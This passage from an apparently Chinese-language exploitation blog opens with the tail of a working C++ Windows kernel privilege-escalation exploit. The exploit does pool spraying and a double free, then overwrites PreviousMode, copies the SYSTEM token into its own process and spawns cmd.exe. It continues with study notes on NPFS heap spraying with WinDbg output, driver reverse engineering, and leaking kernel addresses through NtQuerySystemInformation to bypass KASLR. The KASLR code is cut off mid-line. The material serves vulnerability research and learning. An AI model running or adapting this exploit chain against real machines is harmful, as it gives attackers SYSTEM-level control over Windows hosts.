class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (PIPE_HANDLES p : g_Pipe)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(p.r);</span><br><span class="line">			<span class="built_in">CloseHandle</span>(p.w);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI *PNtReadVirtualMemory)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_opt_ PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	_Out_writes_bytes_(BufferSize) PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ ULONG BufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	_Out_opt_ PULONG NumberOfBytesRead</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtWriteVirtualMemory)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ ULONG NumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">	_Out_opt_ PULONG NumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">atexit</span>(Cleanup);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Setup ...\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Setup</span>();</span><br><span class="line">	g_ThreadExploitHandle = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Hacking thread: %#llx\r\n&quot;</span>, (ULONG64)<span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] LeakByQuerySystemInfomation\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">LeakByQuerySystemInfomation</span>();</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Defragment \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Allocate32</span>(<span class="number">0x1b000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">SprayPipe</span>(<span class="number">0x120</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Allocate target \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Allocate64</span>(<span class="number">0x1b000</span>);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Free first \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Free64</span>();                            </span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Ws2P =&gt; Mdl \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayWs2P; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		g_ProcessList[i] = <span class="built_in">CreateProcessFileHandle</span>(g_ThreadApcHandle);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Allocate Memory avoid crash \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayMm; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Allocate32</span>(<span class="number">0x1b000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Double free \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Free64</span>();           </span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Eafile =&gt; Ws2P \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">SprayEaFile</span>(<span class="number">0x120</span>);</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 找了一天的 BUG</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Close Ws2P Process Handle \r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayWs2P; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(g_ProcessList[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//DWORD dwBytesWriten;</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Exploiting... \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Exploit thread: %#lx \r\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line">	<span class="comment">//WriteFile(sync.w, &quot;Y&quot;, 1, &amp;dwBytesWriten, NULL);</span></span><br><span class="line"></span><br><span class="line">	HANDLE hCur = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 需要确保 _KTHREAD.PreviousMode为0</span></span><br><span class="line">	PNtWriteVirtualMemory NtWriteVirtualMemory = (PNtWriteVirtualMemory)::<span class="built_in">GetProcAddress</span>(::<span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtWriteVirtualMemory&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == NtWriteVirtualMemory)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error GetProcAddress NtWriteVirtualMemory\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//PNtReadVirtualMemory NtReadVirtualMemory = (PNtReadVirtualMemory)::GetProcAddress(::LoadLibraryW(L&quot;ntdll.dll&quot;), &quot;NtReadVirtualMemory&quot;);</span></span><br><span class="line">	<span class="comment">//if (NULL == NtWriteVirtualMemory)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	wprintf(L&quot;[-] Error GetProcAddress NtReadVirtualMemory\r\n&quot;);</span></span><br><span class="line">	<span class="comment">//	exit(1);</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write EPROCESS token =&gt; SYSTEM</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Read System token ...\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">	ULONG BytesWritten = <span class="number">0</span>;</span><br><span class="line">	ULONG64 Token[] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// addr =&gt; buffer</span></span><br><span class="line">	<span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">		hCur,</span><br><span class="line">		&amp;Token,</span><br><span class="line">		(PVOID)(g_SystemEprocess + <span class="number">0x4b8</span> - <span class="number">0x10</span>), <span class="comment">//   +0x4b8 Token</span></span><br><span class="line">		<span class="built_in">sizeof</span>(Token),</span><br><span class="line">		&amp;BytesWritten);</span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Read System token: %#llx %#llx %#llx %#llx\n&quot;</span>, Token[<span class="number">0</span>], Token[<span class="number">1</span>], Token[<span class="number">2</span>], Token[<span class="number">3</span>]);</span><br><span class="line">	<span class="keyword">if</span> (BytesWritten == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error read token, please reboot...\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// buffer =&gt; address</span></span><br><span class="line">	<span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">		hCur,</span><br><span class="line">		(PVOID)(g_CurrentEprocess + <span class="number">0x4b8</span>),</span><br><span class="line">		&amp;Token[<span class="number">2</span>],</span><br><span class="line">		<span class="number">8</span>,</span><br><span class="line">		&amp;BytesWritten</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// write back PreviousMode =&gt; 1</span></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Write PrevoiuaMode 1\r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">	BYTE PreviousMode = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">		hCur,</span><br><span class="line">		(PVOID)(g_ExploitEthread + <span class="number">0x232</span>),</span><br><span class="line">		&amp;PreviousMode,</span><br><span class="line">		<span class="number">1</span>,</span><br><span class="line">		&amp;BytesWritten</span><br><span class="line">	))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtWriteVirtualMemory\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Get shell... \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CLFS"><a href="#CLFS" class="headerlink" title="CLFS"></a>CLFS</h3><p>提了一嘴 CLFS，其UAF的利用</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.exodusintel.com/2022/03/10/exploiting-a-use-after-free-in-windows-common-logging-file-system-clfs/">Exploiting a use-after-free in Windows Common Logging File System</a></li>
</ul>
<p>clfs.sys 漏洞也蛮多的</p>
<p>沉淀，todo…</p>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>尝试解决问题时搜到了其他不错的文章，深度学习一下</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>微软的好东西总是需要我们自己探索。</p>
<p>工具箱： <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a></p>
<h3 id="windows-driver-reverse"><a href="#windows-driver-reverse" class="headerlink" title="windows driver reverse"></a>windows driver reverse</h3><p><a target="_blank" rel="noopener" href="https://voidsec.com/windows-drivers-reverse-engineering-methodology/">windows-drivers-reverse-engineering</a></p>
<p>本人更喜欢使用网络来进行windbg调试</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; bcdedit /dbgsettings <span class="built_in">NET</span> HOSTIP:&lt;DEBUGGER_IP&gt; PORT:<span class="number">50000</span></span><br><span class="line">PS&gt; bcdedit /debug on</span><br></pre></td></tr></table></figure>

<h4 id="Devices-Symlinks"><a href="#Devices-Symlinks" class="headerlink" title="Devices &amp; Symlinks"></a>Devices &amp; Symlinks</h4><p><strong>Devices are interfaces that let processes interact with the driver</strong> while <strong>Symlink is an alias you can use while calling Win32 functions</strong>.</p>
<ul>
<li><code>IoCreateDevice</code> creates DeviceNames: <code>\Device\VulnerableDevice</code></li>
<li><code>IoCreateSymbolicLink</code> creates Symlinks: <code>\\.\VulnerableDevice</code></li>
</ul>
<p>设备的名称：</p>
<ul>
<li>设备命名后，其它内核模式部件可以通过调用IoGetDeviceObjectPointer函数找到该设备，找到设备对象后，就可以向该设备的驱动程序发送IRP。</li>
<li>允许应用程序打开命名设备的句柄，这样它们就可以向驱动程序发送IRP。</li>
</ul>
<p><strong>符号链接名：</strong> 驱动程序为设备创建符号链接，应用程序可以使用符号链接名称来访问设备</p>
<ul>
<li>设备是可以没有名字的，但是得存在符号链接用户态才能访问设备</li>
</ul>
<p>我们可以使用 Sysinternals Suite 里的 <code>winobj.exe</code> 来查看。</p>
<ul>
<li>global 搜索 symlink 就可以找到device</li>
</ul>
<h4 id="Dispatch-Routines"><a href="#Dispatch-Routines" class="headerlink" title="Dispatch Routines"></a>Dispatch Routines</h4><p>派遣函数 MajorFunction</p>
<h3 id="Windows-Kernel-HeapFengshui"><a href="#Windows-Kernel-HeapFengshui" class="headerlink" title="Windows Kernel HeapFengshui"></a>Windows Kernel HeapFengshui</h3><p><a target="_blank" rel="noopener" href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Windows HeapFengShui</a></p>
<p>这篇文章主要介绍了内核态的heap spraying，在HEVD UAF时看过，再看几遍</p>
<p>首先Windows内核提权手段</p>
<ul>
<li>修改权限相关的数据结构</li>
<li>内核态ROP</li>
</ul>
<p>Pool</p>
<ul>
<li>regular pool: 少于一个内存页大小的分配，X64下小于4064字节（16字节用于池头部，16字节分给初始的空闲块）</li>
<li>big pool: 大于于一个内存页大小的分配，没有预留头部空间，内存页是通过<code>nt!PoolBigPageTable</code>来索引跟踪的</li>
</ul>
<p>heap spray: Socket和 NamedPipe</p>
<ul>
<li>创建一个本地Socket套接字并监听，用另外一个线程连接该套接字，然后发出一个写操作（写的数据要超过4K），但不要读。</li>
<li>创建一个命名管道，然后发出一个写操作（同样数据大于4K），且不要读。这也将导致命名管道文件系统（NPFS.SYS）为管道数据分配一块非分页的内存块。</li>
<li>原因是因为 网络栈函数&#x2F;NPFS缓冲区 操作位于DISPATCH_LEVEL(IRQL 2)层，是NonPagedPool。</li>
</ul>
<p>named pipe 比较简单，只需要几行代码就能搞定。但是NPFS会在我们自己的缓冲区前面加上一个包含其自身内联头部的前缀，该前缀被称为<code>DATA_QUEUE_ENTRY</code>。NPFS头部的大小会随版本不同而略有差异</p>
<p><a target="_blank" rel="noopener" href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">Windows Kernel Exploitation</a>文章里使用这个技术，NPFS NpFr：</p>
<ul>
<li>调用 <code>CreatePipe</code> 创建readPipe和writePipe</li>
<li>然后WriteFile往writePipe里写入内容</li>
<li>存在一个0x48大小的BUFFER_HEADER，后面跟着数据，NonPagedPool</li>
</ul>
<p>通过tag寻找pool，这个命令很长时间才能出结果。如果想知道pool大小，可以使用<code>!poolused</code></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!poolfind TagString [PoolType]</span><br></pre></td></tr></table></figure>

<p>调试一下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE readPipe;</span><br><span class="line">	HANDLE writePipe;</span><br><span class="line">	BOOL res;</span><br><span class="line">	CHAR payload[<span class="number">0x30</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(payload, <span class="built_in">sizeof</span>(payload), <span class="number">0x43</span>);</span><br><span class="line"></span><br><span class="line">	res = <span class="built_in">CreatePipe</span>(&amp;readPipe, &amp;writePipe, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!res)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Error CreatePipe&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">WriteFile</span>(writePipe, payload, <span class="built_in">sizeof</span>(payload), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;read: &quot;</span> &lt;&lt; readPipe &lt;&lt; <span class="string">&quot;write: &quot;</span> &lt;&lt; writePipe &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DebugBreak</span>();</span><br><span class="line">	<span class="built_in">CloseHandle</span>(readPipe);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(writePipe);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个handle，查看其中一个Handle信息。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !handle <span class="number">0</span>xA4</span><br><span class="line"></span><br><span class="line">PROCESS ffff9a8824cbd080</span><br><span class="line"><span class="function">    SessionId: <span class="title">none</span>  <span class="title">Cid</span>: 0004    <span class="title">Peb</span>: 00000000  <span class="title">ParentCid</span>: 0000</span></span><br><span class="line"><span class="function">    <span class="title">DirBase</span>: 001<span class="title">ad000</span>  <span class="title">ObjectTable</span>: <span class="title">ffffc98328c04040</span>  <span class="title">HandleCount</span>: 2813.</span></span><br><span class="line"><span class="function">    <span class="title">Image</span>: <span class="title">System</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Kernel</span> <span class="title">handle</span> <span class="title">table</span> <span class="title">at</span> <span class="title">ffffc98328c04040</span> <span class="title">with</span> 2813 <span class="title">entries</span> <span class="title">in</span> <span class="title">use</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">00<span class="title">a4</span>: <span class="title">Object</span>: <span class="title">ffff9a8826ffca20</span>  <span class="title">GrantedAccess</span>: 0012019<span class="title">f</span> (<span class="title">Protected</span>) (<span class="title">Inherit</span>) (<span class="title">Audit</span>) <span class="title">Entry</span>: <span class="title">ffffc98328cb2290</span></span></span><br><span class="line"><span class="function"><span class="title">Object</span>: <span class="title">ffff9a8826ffca20</span>  <span class="title">Type</span>: (<span class="title">ffff9a8824d1cae0</span>) <span class="title">File</span></span></span><br><span class="line"><span class="function">    <span class="title">ObjectHeader</span>: <span class="title">ffff9a8826ffc9f0</span> (<span class="title">new</span> <span class="title">version</span>)</span></span><br><span class="line"><span class="function">        <span class="title">HandleCount</span>: 1  <span class="title">PointerCount</span>: 32768</span></span><br><span class="line"><span class="function">        <span class="title">Directory</span> <span class="title">Object</span>: 00000000  <span class="title">Name</span>: \<span class="title">Device</span>\<span class="title">HarddiskVolume3</span>\$<span class="title">Extend</span>\$<span class="title">RmMetadata</span>\$<span class="title">TxfLog</span>\$<span class="title">TxfLog</span> &#123;<span class="title">clfs</span>&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">0: <span class="title">kd</span>&gt; !<span class="title">pool</span> <span class="title">ffff9a8826ffca20</span> 2</span></span><br><span class="line"><span class="function"><span class="title">Pool</span> <span class="title">page</span> <span class="title">ffff9a8826ffca20</span> <span class="title">region</span> <span class="title">is</span> <span class="title">Nonpaged</span> <span class="title">pool</span></span></span><br><span class="line"><span class="function">*<span class="title">ffff9a8826ffc9a0</span> <span class="title">size</span>:  190 <span class="title">previous</span> <span class="title">size</span>:    0  (<span class="title">Allocated</span>) *<span class="title">File</span></span></span><br><span class="line"><span class="function">		<span class="title">Pooltag</span> <span class="title">File</span> : <span class="title">File</span> <span class="title">objects</span></span></span><br></pre></td></tr></table></figure>

<p>可以看出来NonPaged多了一个0x70大小的内存区域。当我们我们写入0x28大小，也是0x70，存在对齐情况。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !poolused <span class="number">1</span> NpFr</span><br><span class="line">Using a machine size of <span class="number">1</span>ffe7f pages to configure the kd cache</span><br><span class="line">........</span><br><span class="line"> Sorting by Tag</span><br><span class="line"></span><br><span class="line">                            NonPaged                                         Paged</span><br><span class="line"> Tag       Allocs       Frees      Diff         Used       Allocs       Frees      Diff         Used</span><br><span class="line"></span><br><span class="line"> NpFr        <span class="number">2905</span>        <span class="number">2904</span>         <span class="number">1</span>          <span class="number">112</span>            <span class="number">0</span>           <span class="number">0</span>         <span class="number">0</span>            <span class="number">0</span>	DATA_ENTRY records (read/write buffers) , Binary: npfs.sys</span><br><span class="line"></span><br><span class="line">TOTAL        <span class="number">2905</span>        <span class="number">2904</span>         <span class="number">1</span>          <span class="number">112</span>            <span class="number">0</span>           <span class="number">0</span>         <span class="number">0</span>            <span class="number">0</span></span><br></pre></td></tr></table></figure>


<p>多次写 0x30 大小</p>
<ul>
<li>写两次，就会是0xe0 &#x3D;&gt; 0x70 * 2</li>
<li>3次，0x150 &#x3D; 0x70 * 3</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/-poolfind">poolfind (WinDbg)</a>，在本机一个多小时还是出不了结果🤣</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !poolfind NpFr -nonpaged</span><br></pre></td></tr></table></figure>

<h3 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h3><p>文章中提到绕过 KASLR 的一个函数，这个函数可以在<code>ntdll.dll</code>中获取</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSTATUS <span class="title">NtQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out]       PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>但是Windows可能会限制用户模式下对系统信息的访问权限，包括对<code>NtQuerySystemInformation</code>函数的调用</p>
<p>有个不错的仓库：<a target="_blank" rel="noopener" href="https://github.com/sam-b/windows_kernel_address_leaks">windows_kernel_address_leaks</a></p>
<h4 id="SystemModuleInformation"><a href="#SystemModuleInformation" class="headerlink" title="SystemModuleInformation"></a>SystemModuleInformation</h4><p>故名思意，查询模块的基地址</p>
<p>from: <a target="_blank" rel="noopener" href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/">HEVD Exploits</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">INT64 <span class="title">get_kernel_base</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;[&gt;] Getting kernel base address...&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//https://github.com/koczkatamas/CVE-2016-0051/blob/master/EoP/Shellcode/Shellcode.cpp</span></span><br><span class="line">    <span class="comment">//also using the same import technique that @tekwizz123 showed us</span></span><br><span class="line"></span><br><span class="line">    PNtQuerySystemInformation NtQuerySystemInformation =</span><br><span class="line">        (PNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>),</span><br><span class="line">            <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NtQuerySystemInformation) </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] Failed to get the address of NtQuerySystemInformation.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] Last error &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ULONG len = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;len);</span><br><span class="line"></span><br><span class="line">    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)</span><br><span class="line">        <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line">            len,</span><br><span class="line">            MEM_RESERVE | MEM_COMMIT,</span><br><span class="line">            PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation,</span><br><span class="line">        pModuleInfo,</span><br><span class="line">        len,</span><br><span class="line">        &amp;len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] NtQuerySystemInformation failed!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PVOID kernelImageBase = pModuleInfo-&gt;Modules[<span 